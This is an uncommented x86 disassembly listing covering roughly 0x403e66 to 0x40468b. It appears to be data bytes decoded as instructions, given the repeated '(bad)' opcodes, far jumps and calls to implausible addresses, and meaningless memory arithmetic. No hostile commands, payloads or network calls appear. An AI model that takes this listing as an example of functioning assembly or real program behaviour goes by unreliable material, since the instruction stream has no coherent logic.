  403e66:	mov    eax,ds:0x4022b183
  403e6b:	adc    BYTE PTR [eax+0x62],al
  403e6e:	add    bl,BYTE PTR [eax+0x60112280]
  403e74:	inc    ecx
  403e75:	sub    DWORD PTR [edx],eax
  403e77:	int3   
  403e78:	inc    eax
  403e79:	mov    ds:0x241b004,eax
  403e7e:	inc    ecx
  403e7f:	and    BYTE PTR [eax],al
  403e81:	add    BYTE PTR [eax+0x47004200],al
  403e87:	sbb    DWORD PTR [eax],ecx
  403e89:	add    al,BYTE PTR [eax]
  403e8b:	inc    ecx
  403e8c:	add    cl,0x21
  403e8f:	cmp    dl,BYTE PTR [eax]
  403e91:	add    BYTE PTR [eax+0x406246],al
  403e97:	inc    esp
  403e98:	and    al,0x20
  403e9a:	add    DWORD PTR [eax-0x38],eax
  403e9d:	or     BYTE PTR [eax-0xb9dfc78],ch
  403ea3:	add    ah,BYTE PTR [eax]
  403ea5:	push   esi
  403ea6:	and    DWORD PTR [eax],esp
  403ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ea9:	jno    0x403e51
  403eab:	mov    ds:0x90300088,eax
  403eb0:	mov    ds:0x26e02008,al
  403eb5:	mov    BYTE PTR [ecx],al
  403eb7:	test   BYTE PTR [edx],bh
  403eb9:	es push esp
  403ebb:	dec    ecx
  403ebc:	add    BYTE PTR [eax],ah
  403ebe:	and    dl,BYTE PTR [edi]
  403ec0:	adc    BYTE PTR [eax+0x8],ah
  403ec3:	inc    esp
  403ec4:	or     BYTE PTR [eax],cl
  403ec6:	popa   
  403ec7:	add    edi,DWORD PTR [ecx+eax*1]
  403eca:	adc    DWORD PTR [eax+eiz*1],eax
  403ecd:	rol    BYTE PTR [eax],0x19
  403ed0:	xchg   ecx,eax
  403ed1:	add    al,0x10
  403ed3:	add    BYTE PTR [eax],cl
  403ed5:	and    ch,BYTE PTR [eax]
  403ed7:	inc    esp
  403ed8:	xchg   edx,eax
  403ed9:	mov    WORD PTR [ecx],fs
  403edb:	add    dl,BYTE PTR [ecx+0x21]
  403ede:	add    al,0x92
  403ee0:	bound  eax,QWORD PTR [eax]
  403ee2:	jo     0x403ef4
  403ee4:	adc    DWORD PTR [eax-0x65e7fe00],eax
  403eea:	adc    BYTE PTR [ecx+ebp*4+0x304a6808],al
  403ef1:	push   eax
  403ef2:	or     BYTE PTR [eax+edx*4],al
  403ef5:	les    eax,FWORD PTR [esi]
  403ef7:	mov    DWORD PTR [eax+eax*1+0x12],edx
  403efb:	xor    BYTE PTR [eax-0x80],ah
  403efe:	call   DWORD PTR ds:0x437130
  403f04:	adc    BYTE PTR [ebx+ecx*1+0x0],al
  403f08:	hlt    
  403f09:	add    eax,0x3120a0
  403f0e:	test   DWORD PTR [esi],esi
  403f10:	(bad)
  403f13:	mov    ch,0x0
  403f15:	inc    eax
  403f16:	add    DWORD PTR [eax],0x5d1d0604
  403f1c:	mov    BYTE PTR [eax+0x29],al
  403f1f:	adc    ecx,DWORD PTR [eax]
  403f21:	add    DWORD PTR [edx+0xb01200b],eax
  403f27:	add    BYTE PTR [edx+0x10200083],dl
  403f2d:	add    DWORD PTR [eax+0x2260aa40],eax
  403f33:	add    BYTE PTR [ecx],al
  403f35:	inc    eax
  403f36:	call   0x2444843b
  403f3b:	add    al,BYTE PTR ds:0x48410200
  403f41:	add    al,0x10
  403f43:	add    BYTE PTR [ecx-0x68],dl
  403f46:	or     BYTE PTR [eax+0x31],cl
  403f49:	push   edx
  403f4a:	sbb    esp,DWORD PTR [ebx]
  403f4c:	and    al,BYTE PTR [eax+0x0]
  403f4f:	sub    eax,0x602e0080
  403f54:	and    ebx,DWORD PTR [eax+0x630024]
  403f5a:	add    al,0xad
  403f5c:	or     al,0xa4
  403f5e:	ret    0x2202
  403f61:	add    DWORD PTR [eax],ecx
  403f63:	add    BYTE PTR [edx+0x0],al
  403f66:	add    BYTE PTR [eax],al
  403f68:	xor    eax,0x51840804
  403f6d:	add    DWORD PTR [edi],eax
  403f6f:	adc    al,0xa3
  403f71:	add    BYTE PTR [eax+ebx*1-0x24],al
  403f75:	add    ah,bh
  403f77:	add    eax,DWORD PTR ds:0x30404801
  403f7d:	adc    BYTE PTR [ecx+0x605108a0],al
  403f83:	add    BYTE PTR [ebp-0x28479efd],dl
  403f89:	mov    eax,ds:0x88240069
  403f8e:	inc    eax
  403f8f:	sbb    al,0x54
  403f91:	or     BYTE PTR [eax+0x9800001],0x40
  403f98:	and    al,0x35
  403f9a:	add    BYTE PTR [eax+0x17020ca0],al
  403fa0:	adc    BYTE PTR [eax+0x222ca008],dl
  403fa6:	adc    eax,0x491a0028
  403fab:	test   eax,edx
  403fad:	xchg   esp,eax
  403fae:	add    BYTE PTR [edx-0x5e50f300],0x90
  403fb5:	push   eax
  403fb6:	add    al,0x46
  403fb8:	inc    esi
  403fb9:	in     eax,0xe4
  403fbb:	add    BYTE PTR [ecx+0x21881084],0x43
  403fc2:	fs push es
  403fc4:	inc    eax
  403fc5:	sbb    BYTE PTR gs:[eax+ebx*4],cl
  403fc9:	sub    DWORD PTR [eax+0x23118e8],eax
  403fcf:	enter  0x9408,0x0
  403fd3:	inc    ecx
  403fd4:	or     eax,0x5042a90
  403fd9:	inc    eax
  403fda:	nop
  403fdb:	add    BYTE PTR [eax+0x20020002],ah
  403fe1:	sub    BYTE PTR [ecx],0x29
  403fe4:	add    BYTE PTR [edx],dl
  403fe6:	and    eax,DWORD PTR [esi+eiz*1+0x3]
  403fea:	or     BYTE PTR [ecx-0x5affe800],dh
  403ff0:	and    DWORD PTR [eax],0x40222509
  403ff6:	and    BYTE PTR [ebx-0x77],0x42
  403ffa:	add    ebp,DWORD PTR [eax]
  403ffc:	mov    DWORD PTR [eax-0x77abeff6],esp
  404002:	adc    al,0x6
  404004:	add    BYTE PTR [eax],0x20
  404007:	adc    BYTE PTR [eax],cl
  404009:	or     BYTE PTR [eax+0xc],al
  40400c:	adc    BYTE PTR [edx],0x20
  40400f:	push   eax
  404010:	adc    BYTE PTR [ebx+0x3184008],al
  404016:	push   ss
  404017:	xchg   esp,eax
  404018:	add    DWORD PTR [eax-0x76],esp
  40401b:	or     edx,DWORD PTR [eax]
  40401d:	fsub   DWORD PTR [eax+eax*2-0x6ebdec00]
  404024:	and    ah,BYTE PTR [eax+eax*1+0x12]
  404028:	push   ds
  404029:	push   edx
  40402a:	add    DWORD PTR [eax],eax
  40402c:	push   ss
  40402d:	add    DWORD PTR [eax],0x878272
  404033:	adc    BYTE PTR [edx+0x51],cl
  404036:	adc    BYTE PTR [ecx],0x1
  404039:	bound  ebp,QWORD PTR [eax+0x142410e]
  40403f:	mov    ds:0x1412880e,eax
  404044:	or     BYTE PTR [eax+0x18505520],al
  40404a:	add    BYTE PTR [eax+eax*2+0x10],0x0
  40404f:	sbb    ch,BYTE PTR [edx]
  404051:	adc    eax,eax
  404053:	add    DWORD PTR [eax],esp
  404055:	adc    BYTE PTR [ecx+0x207290cf],ah
  40405b:	add    BYTE PTR [ebp-0x73],0x60
  40405f:	inc    edx
  404060:	mov    ds:0x1421400a,al
  404065:	add    BYTE PTR [ecx],cl
  404067:	add    DWORD PTR [esp],0x8020942
  40406e:	and    BYTE PTR [eax],cl
  404070:	or     DWORD PTR [eax+0x0],esp
  404073:	add    BYTE PTR [eax],dl
  404075:	inc    eax
  404076:	or     BYTE PTR [ecx-0x73],0xd4
  40407a:	add    al,0xb0
  40407c:	add    ah,BYTE PTR [ecx-0x7edf7ede]
  404082:	inc    ecx
  404083:	add    BYTE PTR [ecx+eax*8-0x772ff6fc],dh
  40408a:	dec    edx
  40408b:	mov    al,ds:0x2c008a00
  404090:	dec    edx
  404091:	inc    edx
  404092:	or     al,0x8
  404094:	adc    DWORD PTR [eax+0x0],esp
  404097:	sbb    DWORD PTR ds:0x61a2884a,eax
  40409d:	sub    BYTE PTR [ecx],0x40
  4040a0:	jmp    0x2401:0x34a401a
  4040a7:	push   es
  4040a8:	inc    eax
  4040a9:	push   es
  4040aa:	adc    BYTE PTR [eax+eax*1],al
  4040ad:	adc    BYTE PTR [edx],al
  4040af:	add    DWORD PTR [eax],esp
  4040b1:	inc    ebp
  4040b2:	add    al,0xa
  4040b4:	and    DWORD PTR ds:0x3240834a,esp
  4040ba:	xor    BYTE PTR [eax],al
  4040bc:	dec    eax
  4040bd:	adc    DWORD PTR ds:0x4a0a8,ebp
  4040c3:	add    BYTE PTR [eax+0x480460],al
  4040c9:	push   es
  4040ca:	add    BYTE PTR [edx],ah
  4040cc:	mov    al,ds:0xc008b124
  4040d1:	mov    ecx,ss
  4040d3:	or     esi,DWORD PTR [esi]
  4040d5:	or     BYTE PTR [eax+edx*1+0x52],al
  4040d9:	mov    eax,0x280059
  4040de:	and    DWORD PTR [eax-0x2cf5ef88],esp
  4040e4:	adc    DWORD PTR [esi-0x7a8ff8dc],eax
  4040ea:	add    DWORD PTR [edx+edx*1-0x6dfdf600],eax
  4040f1:	and    DWORD PTR [eax],esp
  4040f3:	add    BYTE PTR [ecx-0x7d],al
  4040f6:	add    al,0x41
  4040f8:	ret    
  4040f9:	or     BYTE PTR [ecx+0x899430],al
  4040ff:	inc    eax
  404100:	and    DWORD PTR [edx],esp
  404102:	rcl    BYTE PTR ds:0x50009202,0x0
  404109:	xor    al,0x82
  40410b:	adc    DWORD PTR [edx+0x10216218],edx
  404111:	or     BYTE PTR [eax+edx*2],al
  404114:	or     eax,0x60412d40
  404119:	arpl   WORD PTR [ebx],ax
  40411b:	or     BYTE PTR [edx],al
  40411d:	ret    
  40411e:	and    al,BYTE PTR [eax]
  404120:	mov    ds:0x2280208,eax
  404125:	and    DWORD PTR [eax+0x41],0x8
  404129:	add    BYTE PTR [ecx+0x10014811],al
  40412f:	sub    al,BYTE PTR [eax+0x1380030d]
  404135:	inc    eax
  404136:	add    BYTE PTR [edx+ebp*1],ah
  404139:	sbb    edx,eax
  40413b:	rol    DWORD PTR [edx+0x45181000],0x4
  404142:	test   al,0x99
  404144:	rcl    DWORD PTR [ecx+0x34241e45],0x61
  40414b:	sub    eax,DWORD PTR [edx+0xc50c202]
  404151:	add    BYTE PTR [eax-0x80],dh
  404154:	or     BYTE PTR [eax+0x0],al
  404157:	xchg   esi,eax
  404158:	add    BYTE PTR [esi],dl
  40415a:	and    BYTE PTR [eax+ecx*8],ah
  40415d:	xor    edx,DWORD PTR [ecx]
  40415f:	and    BYTE PTR [eax+0x8],ah
  404162:	mov    al,ds:0xa208400d
  404167:	push   cs
  404168:	(bad)  
  40416a:	add    BYTE PTR [eax],ah
  40416c:	adc    dl,BYTE PTR [ecx]
  40416e:	dec    eax
  40416f:	add    BYTE PTR [esi],al
  404171:	add    BYTE PTR [eax],ah
  404173:	add    BYTE PTR [edx+0x630b804],al
  404179:	add    BYTE PTR [eax],dl
  40417b:	or     DWORD PTR [eax-0x7dfbfbf8],ecx
  404181:	mov    ah,0xa
  404183:	and    BYTE PTR [ebp+eax*1-0x7ecf5e00],dh
  40418a:	xchg   esp,eax
  40418b:	add    al,cl
  40418d:	adc    al,0x0
  40418f:	mov    DWORD PTR [ecx],ecx
  404191:	add    DWORD PTR [edx],edi
  404193:	add    BYTE PTR [eax],ch
  404195:	xor    BYTE PTR [eax],cl
  404197:	xor    BYTE PTR [eax+0x0],ch
  40419a:	add    BYTE PTR [eax],dl
  40419c:	rcl    BYTE PTR [eax+0x14],0xe2
  4041a0:	mov    BYTE PTR ds:0x85000210,al
  4041a6:	inc    ecx
  4041a7:	inc    eax
  4041a8:	mov    BYTE PTR [ecx],al
  4041aa:	add    BYTE PTR [edi],dl
  4041ac:	adc    BYTE PTR [eax],al
  4041ae:	and    eax,0x4546004
  4041b3:	or     al,dh
  4041b5:	add    DWORD PTR [eax],0x210010a9
  4041bb:	add    BYTE PTR [ecx+eax*1+0x40182204],dl
  4041c2:	adc    BYTE PTR [eax+0x30050105],ah
  4041c8:	add    dl,BYTE PTR [esi]
  4041ca:	mov    ds:0x15440a0,al
  4041cf:	and    BYTE PTR [eax+0x18],0x29
  4041d3:	add    BYTE PTR [ebx+0x5263182d],al
  4041d9:	add    al,0x42
  4041db:	add    BYTE PTR [eax],cl
  4041dd:	or     BYTE PTR [ebx],al
  4041df:	and    DWORD PTR [eax+esi*4],eax
  4041e2:	add    BYTE PTR [eax],al
  4041e4:	add    ah,BYTE PTR [edx+0x0]
  4041e7:	and    BYTE PTR [ecx],0xa9
  4041ea:	inc    eax
  4041eb:	scas   al,BYTE PTR es:[edi]
  4041ec:	add    al,BYTE PTR [edx+0x365005c0]
  4041f2:	pusha  
  4041f3:	and    bl,BYTE PTR [eax+eax*1+0x52213480]
  4041fa:	add    eax,DWORD PTR [ecx]
  4041fc:	rol    BYTE PTR [eax],0x10
  4041ff:	push   ss
  404200:	or     BYTE PTR [eax],dh
  404202:	adc    eax,0x103c1100
  404207:	adc    al,0x11
  404209:	and    BYTE PTR [ebp+0x40115054],dl
  40420f:	add    esp,DWORD PTR [edx]
  404211:	and    BYTE PTR [eax+0xc040a00],cl
  404217:	add    dl,bl
  404219:	inc    edx
  40421a:	or     BYTE PTR [ecx-0x80],dl
  40421d:	mov    DWORD PTR [edx+0xd310407],esp
  404223:	adc    BYTE PTR [eax+0x0],cl
  404226:	mov    al,0x80
  404228:	sbb    DWORD PTR [eax],esp
  40422a:	sub    BYTE PTR [edx],0x2
  40422d:	adc    eax,0xc041005a
  404232:	bound  eax,QWORD PTR [ebp+eax*8-0x2fef7ffc]
  404239:	add    al,ch
  40423b:	mov    eax,ebp
  40423d:	and    BYTE PTR [eax+0x2a],ch
  404240:	add    al,0x92
  404242:	add    BYTE PTR [ecx+0x1],0x48
  404246:	xor    al,BYTE PTR [edi]
  404248:	adc    al,0xc
  40424a:	add    BYTE PTR [eax+ebx*1],ah
  40424d:	and    BYTE PTR [edx+0x2],al
  404250:	add    ah,BYTE PTR [edx-0x5fc6bfdc]
  404256:	inc    edx
  404257:	cdq    
  404258:	add    BYTE PTR [edx],al
  40425a:	adc    BYTE PTR [eax+0x3],dh
  40425d:	test   DWORD PTR [ebx],eax
  40425f:	xor    al,BYTE PTR [eax+ebp*2-0x6ffd53f8]
  404266:	rcl    BYTE PTR [ecx],0x64
  404269:	mov    eax,0x8002b8
  40426e:	adc    BYTE PTR [esi],0x66
  404271:	and    BYTE PTR [eax],0x0
  404274:	mov    eax,ds:0x42a0006d
  404279:	adc    BYTE PTR [esi],al
  40427b:	adc    DWORD PTR [eax+ecx*1],edx
  40427e:	and    eax,0x23023002
  404283:	cmp    DWORD PTR [edi+0x240882b6],edx
  404289:	adc    BYTE PTR [edx],ah
  40428b:	ror    BYTE PTR [eax+0x12],0x60
  40428f:	bound  eax,QWORD PTR [ebx+0x2203054]
  404295:	test   al,0x0
  404297:	and    BYTE PTR [ecx+0x50426000],al
  40429d:	push   esp
  40429e:	and    BYTE PTR [eax-0x5fdbd5bf],dl
  4042a4:	adc    BYTE PTR [eax],0x69
  4042a7:	mov    al,ds:0xc873a572
  4042ac:	push   edx
  4042ad:	add    BYTE PTR [edx+0x20919000],ah
  4042b3:	add    al,0x0
  4042b5:	cdq    
  4042b6:	and    DWORD PTR [eax],ebp
  4042b8:	or     edx,DWORD PTR [eax+0x2]
  4042bb:	xor    eax,DWORD PTR [eax+0x60]
  4042be:	dec    eax
  4042bf:	inc    edx
  4042c0:	retf   0x281
  4042c3:	push   ebx
  4042c4:	add    al,0x43
  4042c6:	cwde   
  4042c7:	adc    dh,BYTE PTR [eax]
  4042c9:	add    al,0x47
  4042cb:	add    al,0x1
  4042cd:	popa   
  4042ce:	adc    DWORD PTR [eax],ebp
  4042d0:	add    al,0x51
  4042d2:	rol    BYTE PTR ds:0xa092007,1
  4042d8:	mov    DWORD PTR [eax+0x10016208],ebx
  4042de:	or     BYTE PTR [eax-0x3a],cl
  4042e1:	add    BYTE PTR [eax],ah
  4042e3:	and    eax,0x28124e18
  4042e8:	inc    ecx
  4042e9:	xchg   BYTE PTR [eax],cl
  4042eb:	push   esp
  4042ec:	push   0x18c0222a
  4042f1:	pusha  
  4042f2:	add    cl,BYTE PTR [eax+ebx*2+0x21348001]
  4042f9:	loope  0x4042fc
  4042fb:	add    DWORD PTR [eax+0x1400b00],edi
  404301:	or     BYTE PTR [eax],dl
  404303:	inc    ecx
  404304:	dec    eax
  404305:	adc    BYTE PTR [ecx+0x6c484a50],dh
  40430b:	daa    
  40430c:	add    al,0x18
  40430f:	sbb    ah,BYTE PTR [ecx]
  404311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404312:	add    BYTE PTR [eax-0xe],dh
  404315:	and    BYTE PTR [eax+0x8003108],ch
  40431b:	add    BYTE PTR [edx],al
  40431d:	dec    ecx
  40431e:	or     BYTE PTR [ebx],0x0
  404321:	push   ss
  404322:	push   ebp
  404323:	test   DWORD PTR [ecx],eax
  404325:	xchg   edx,eax
  404326:	fs in  eax,0x88
  404329:	add    BYTE PTR [edx],al
  40432b:	inc    esp
  40432c:	xor    al,0x1
  40432e:	add    BYTE PTR [esi],0x2a
  404331:	dec    eax
  404332:	inc    ax
  404334:	inc    ecx
  404335:	add    BYTE PTR [edx],al
  404337:	inc    edx
  404338:	mov    BYTE PTR [eax],0x2
  40433b:	ret    
  40433c:	xor    eax,0x9c4c2a80
  404341:	add    dl,al
  404343:	add    dh,BYTE PTR [eax+eax*2+0x48842694]
  40434a:	and    BYTE PTR [eax+0x10],0xa8
  40434e:	pusha  
  40434f:	mov    ds:0x41248948,al
  404354:	and    BYTE PTR [eax],al
  404356:	sub    esi,eax
  404358:	shl    BYTE PTR [edx],0x1
  40435b:	cwde   
  40435c:	push   es
  40435d:	adc    BYTE PTR [ecx],al
  40435f:	adc    BYTE PTR [eax+ecx*4],dl
  404362:	sub    BYTE PTR [ecx+0x1],al
  404365:	push   es
  404366:	add    BYTE PTR [eax+ecx*1],0x10
  40436a:	push   cs
  40436b:	nop
  40436c:	mov    al,ds:0x8200880
  404371:	or     al,0x0
  404373:	add    al,BYTE PTR [ecx]
  404375:	or     eax,0x31102100
  40437a:	add    DWORD PTR [ecx-0x5ffefe92],edi
  404380:	and    al,BYTE PTR [ebx]
  404382:	mov    eax,0xd04981f
  404387:	sbb    DWORD PTR [eax],eax
  404389:	jo     0x4043ec
  40438b:	mov    eax,ds:0x10b408b0
  404390:	inc    edx
  404391:	push   cs
  404392:	sub    BYTE PTR [ebp-0x69f97cd0],al
  404398:	add    BYTE PTR [eax+0x3],al
  40439b:	inc    ecx
  40439c:	or     BYTE PTR [eax],al
  40439e:	add    ah,BYTE PTR [eax]
  4043a0:	add    al,ch
  4043a2:	inc    eax
  4043a3:	adc    cl,ch
  4043a5:	or     BYTE PTR [esi-0x7ae77adf],ah
  4043ab:	mov    BYTE PTR [ecx],bl
  4043ad:	mov    BYTE PTR [eax-0x11efdf62],dl
  4043b3:	das    
  4043b4:	sub    BYTE PTR [eax],al
  4043b6:	add    al,0x30
  4043b8:	and    BYTE PTR [eax-0x7a],cl
  4043bb:	or     BYTE PTR [edx+edx*1+0xe],ch
  4043bf:	sbb    eax,0x10200444
  4043c4:	or     al,0x29
  4043c6:	add    al,0xa8
  4043c8:	and    ecx,edx
  4043ca:	dec    eax
  4043cb:	bound  eax,QWORD PTR [eax+0x20]
  4043ce:	inc    ecx
  4043cf:	ror    DWORD PTR [ecx+0x2],0x44
  4043d3:	and    BYTE PTR [edx+0x0],al
  4043d6:	push   ecx
  4043d7:	add    eax,DWORD PTR [eax]
  4043d9:	sbb    BYTE PTR [edx+0x1e50a87],ah
  4043df:	push   ss
  4043e0:	push   eax
  4043e1:	add    al,BYTE PTR [ebp+0x51002020]
  4043e7:	sub    cl,BYTE PTR [esi+0x8]
  4043ea:	call   0xc9aa:0x41282604
  4043f1:	add    BYTE PTR [eax],al
  4043f3:	mov    al,ds:0xd4088802
  4043f8:	mov    BYTE PTR [eax],ch
  4043fa:	and    BYTE PTR [ecx],al
  4043fc:	and    BYTE PTR [esi-0x75fe3340],dl
  404402:	inc    eax
  404403:	dec    esi
  404404:	nop
  404405:	adc    cl,BYTE PTR [eax]
  404407:	add    dl,BYTE PTR [esi]
  404409:	or     DWORD PTR [eax-0x39e7f7a6],ebp
  40440f:	inc    ebp
  404410:	or     al,0x4
  404412:	or     BYTE PTR [esi-0x7adf35fc],0x80
  404419:	lea    ebx,[ecx]
  40441b:	inc    edx
  40441c:	add    BYTE PTR [eax],al
  40441e:	sub    BYTE PTR [edx],0x11
  404421:	add    BYTE PTR [eax+0x0],al
  404424:	mov    al,ds:0x2009201
  404429:	movhps xmm3,QWORD PTR [eax-0x7c]
  40442d:	hlt    
  40442e:	add    esp,DWORD PTR [eax]
  404430:	xor    BYTE PTR [eax+0x52],dl
  404433:	and    BYTE PTR [ecx],al
  404435:	or     eax,0x28080730
  40443a:	adc    BYTE PTR [eax+0x50],0xa8
  40443e:	inc    edx
  40443f:	or     BYTE PTR [eax],al
  404441:	xor    eax,0x11022943
  404446:	and    DWORD PTR [eax-0x7e07fbf7],eax
  40444c:	adc    cl,al
  40444e:	retf   0x4020
  404451:	add    al,BYTE PTR [edx]
  404453:	sub    al,0x18
  404455:	cmp    DWORD PTR [edx],ebp
  404457:	add    BYTE PTR [ecx],cl
  404459:	test   al,0x82
  40445b:	and    al,BYTE PTR [ebx]
  40445d:	nop
  40445e:	rol    BYTE PTR [edx+0x20286c53],cl
  404464:	adc    ch,BYTE PTR [ebx]
  404466:	or     DWORD PTR [edx],esp
  404468:	sbb    BYTE PTR [edx+0x30],ch
  40446b:	dec    esp
  40446c:	or     bh,BYTE PTR [ecx+0x10]
  40446f:	adc    al,al
  404471:	sub    BYTE PTR [eax-0x6e6bfdd8],0x3d
  404478:	xor    esp,edx
  40447a:	or     al,0x80
  40447c:	xchg   edx,eax
  40447d:	and    al,0x40
  40447f:	push   es
  404480:	mov    cl,BYTE PTR [ecx+eiz*1+0x1284200]
  404487:	add    BYTE PTR [eax],0x0
  40448a:	add    BYTE PTR [eax],bh
  40448c:	dec    edx
  40448d:	shl    BYTE PTR [eax],0x0
  404490:	and    BYTE PTR [ecx],cl
  404492:	adc    BYTE PTR [ecx],al
  404494:	add    BYTE PTR [eax+eax*1],bh
  404497:	add    BYTE PTR [edx+ecx*1],dl
  40449a:	mov    eax,ds:0x15800099
  40449f:	add    ch,BYTE PTR [eax+ecx*1]
  4044a2:	add    al,0x20
  4044a4:	mov    BYTE PTR [eax],ah
  4044a6:	fwait
  4044a7:	add    al,BYTE PTR [ecx]
  4044a9:	add    BYTE PTR [eax],al
  4044ab:	and    BYTE PTR [eax+0x201a4208],ch
  4044b1:	mov    BYTE PTR [eax+0xa4043],cl
  4044b7:	nop
  4044b8:	add    DWORD PTR [ebx],ebx
  4044ba:	adc    BYTE PTR [eax+0x11],ch
  4044bd:	inc    eax
  4044be:	add    al,BYTE PTR [edx+0x38]
  4044c1:	or     BYTE PTR [eax+esi*1],0x8
  4044c5:	(bad)  
  4044c6:	or     BYTE PTR [eax],al
  4044c8:	add    BYTE PTR [esp+edx*4+0x8084518],dl
  4044cf:	enter  0x9844,0x4
  4044d3:	xor    eax,0x42e14069
  4044d8:	sub    BYTE PTR [ecx],al
  4044da:	push   es
  4044db:	add    bh,al
  4044dd:	add    BYTE PTR [eax-0x7637bbe0],bl
  4044e3:	and    BYTE PTR [edx],ah
  4044e5:	mov    al,ds:0xe04114a
  4044ea:	or     BYTE PTR [ecx],dl
  4044ec:	and    cl,BYTE PTR [eax]
  4044ee:	sub    BYTE PTR [ecx],dl
  4044f0:	les    ebx,FWORD PTR [esp+eax*8]
  4044f3:	or     al,0x0
  4044f5:	xor    al,BYTE PTR [ecx+ebp*2]
  4044f8:	inc    eax
  4044f9:	or     cl,BYTE PTR [ebx]
  4044fb:	add    eax,0x89e0004
  404500:	popa   
  404501:	jns    0x404503
  404503:	cmp    BYTE PTR [ecx-0x787fdbac],al
  404509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40450a:	and    BYTE PTR [esi],cl
  40450c:	add    BYTE PTR [eax+0x15],ah
  40450f:	add    al,0x40
  404511:	inc    edx
  404512:	and    DWORD PTR [edx-0x7e],0xd008cc40
  404519:	add    ch,BYTE PTR [esi+0x40]
  40451c:	and    BYTE PTR [eax+0x1],dh
  40451f:	add    al,0x20
  404521:	pusha  
  404522:	or     DWORD PTR [eax],eax
  404524:	rol    DWORD PTR [ecx+eax*1],0x40
  404528:	add    BYTE PTR [edi],ah
  40452a:	add    al,BYTE PTR [eax+0xc902104]
  404530:	inc    eax
  404531:	loope  0x404583
  404533:	(bad)  
  404534:	fmul   QWORD PTR [ebx+edx*4+0x68]
  404538:	loope  0x404542
  40453a:	sbb    esp,DWORD PTR [edx+0x25]
  40453d:	test   eax,0x1c6444
  404542:	sub    ebx,ecx
  404544:	add    BYTE PTR [edx+ecx*1],0x3
  404548:	add    BYTE PTR [edi-0x6e],ah
  40454b:	mov    al,BYTE PTR [ebx-0x617d6bb7]
  404551:	fsub   DWORD PTR [eax]
  404553:	sbb    al,0x2
  404555:	test   DWORD PTR [ebp+0x0],ecx
  404558:	xor    eax,DWORD PTR [ebx+eax*4+0x20001215]
  40455f:	inc    eax
  404560:	add    al,0x20
  404562:	add    BYTE PTR [edx+0x3],al
  404565:	and    DWORD PTR [ecx],eax
  404567:	and    al,0x1c
  404569:	pushf  
  40456a:	nop
  40456b:	or     BYTE PTR [ebp+0x50e68009],al
  404571:	add    esi,DWORD PTR [eax+0x2]
  404574:	mov    al,ds:0x488414
  404579:	add    al,0xc0
  40457b:	jmp    0xc071ca01
  404580:	sbb    BYTE PTR [eax],dl
  404582:	add    al,0x4
  404584:	dec    ecx
  404585:	xor    eax,0x14730c01
  40458a:	or     BYTE PTR ds:0xa744c816,al
  404590:	and    dh,al
  404592:	or     cl,dl
  404594:	sub    BYTE PTR [ebx-0x5d],cl
  404597:	nop
  404598:	inc    ecx
  404599:	add    BYTE PTR [edx],al
  40459b:	xchg   edx,eax
  40459c:	inc    eax
  40459d:	sub    BYTE PTR [edi],al
  40459f:	call   0xa30c:0x344283
  4045a6:	sub    al,0x88
  4045a8:	sub    al,0xd0
  4045aa:	inc    eax
  4045ab:	or     BYTE PTR [eax+0x4],dl
  4045ae:	dec    esi
  4045af:	add    DWORD PTR [eax+ecx*2+0x8],ebp
  4045b3:	and    BYTE PTR [eax],ch
  4045b5:	rcl    BYTE PTR ss:[ecx-0x13fff000],0x20
  4045bd:	pop    esp
  4045be:	inc    eax
  4045bf:	add    al,0x90
  4045c1:	add    ah,0x40
  4045c4:	add    DWORD PTR [eax+0x28520928],eax
  4045ca:	lods   al,BYTE PTR ds:[esi]
  4045cb:	and    BYTE PTR [eax+eax*2],al
  4045ce:	add    dh,BYTE PTR [esi]
  4045d0:	inc    edx
  4045d1:	rcl    BYTE PTR [esi],0x41
  4045d4:	add    DWORD PTR [edx-0x57fdbd7f],esp
  4045da:	inc    ecx
  4045db:	adc    DWORD PTR [eax+0x29],eax
  4045de:	adc    BYTE PTR [ebx],al
  4045e0:	add    eax,edx
  4045e2:	add    eax,eax
  4045e4:	add    BYTE PTR [ecx+0x10001910],0x82
  4045eb:	and    ch,BYTE PTR [eax]
  4045ed:	add    BYTE PTR [eax],al
  4045ef:	sub    BYTE PTR [ecx],ah
  4045f1:	adc    BYTE PTR [edx],ch
  4045f3:	adc    BYTE PTR [ecx],al
  4045f5:	or     BYTE PTR [eax],ch
  4045f7:	daa    
  4045f8:	or     ch,al
  4045fa:	sub    edi,DWORD PTR [eax-0x76]
  4045fd:	sub    BYTE PTR [eax],al
  4045ff:	add    DWORD PTR [esp+eax*1],ecx
  404602:	rol    DWORD PTR [ecx-0x2c],1
  404605:	add    dl,cl
  404607:	sub    al,0x85
  404609:	pusha  
  40460a:	or     al,0x64
  40460c:	or     BYTE PTR [ecx],0x42
  40460f:	sbb    BYTE PTR [edx+eax*8-0x80],dl
  404613:	adc    BYTE PTR [eax-0x3f558000],al
  404619:	and    BYTE PTR [edx],cl
  40461b:	add    al,BYTE PTR [ebx]
  40461d:	sbb    al,BYTE PTR [ebx+0x8]
  404620:	or     eax,0x2202542a
  404625:	inc    edi
  404626:	add    BYTE PTR [eax+0x21],al
  404629:	and    dl,BYTE PTR [eax+edx*1+0x13]
  40462d:	enter  0x812,0x0
  404631:	sub    BYTE PTR [esi-0x3ffff3fc],al
  404637:	inc    esi
  404638:	inc    edx
  404639:	jmp    0x1cd44e3e
  40463e:	mov    DWORD PTR [eax],ebp
  404640:	ret    
  404641:	inc    esp
  404642:	shl    BYTE PTR [edx-0x7bfe8fe0],0x0
  404649:	xor    BYTE PTR [eax+ebp*1+0x2a],dl
  40464d:	bound  esp,QWORD PTR [ecx]
  40464f:	add    dl,BYTE PTR [esi]
  404651:	add    ah,al
  404653:	sbb    al,0x40
  404655:	add    BYTE PTR [edx+0x2200109],al
  40465b:	and    BYTE PTR [ecx],ah
  40465d:	add    dl,BYTE PTR [ecx+0x21]
  404660:	inc    eax
  404661:	mov    ah,BYTE PTR [eax]
  404663:	nop
  404664:	inc    esp
  404665:	adc    BYTE PTR [eax],al
  404667:	xchg   ecx,eax
  404668:	bound  edx,QWORD PTR [ebx]
  40466a:	mov    ds:0x8112041,eax
  40466f:	pop    es
  404670:	enter  0x1000,0x23
  404674:	add    BYTE PTR [eax],al
  404676:	add    BYTE PTR [eax],dl
  404678:	add    al,BYTE PTR [eax+0x2c009000]
  40467e:	push   eax
  40467f:	add    BYTE PTR [esi],al
  404681:	inc    ecx
  404682:	mov    BYTE PTR [ebx+ecx*1-0x52],al
  404686:	adc    DWORD PTR [edx],eax
  404688:	add    al,0x0
  40468a:	inc    eax
  40468b:	add    al,0x0
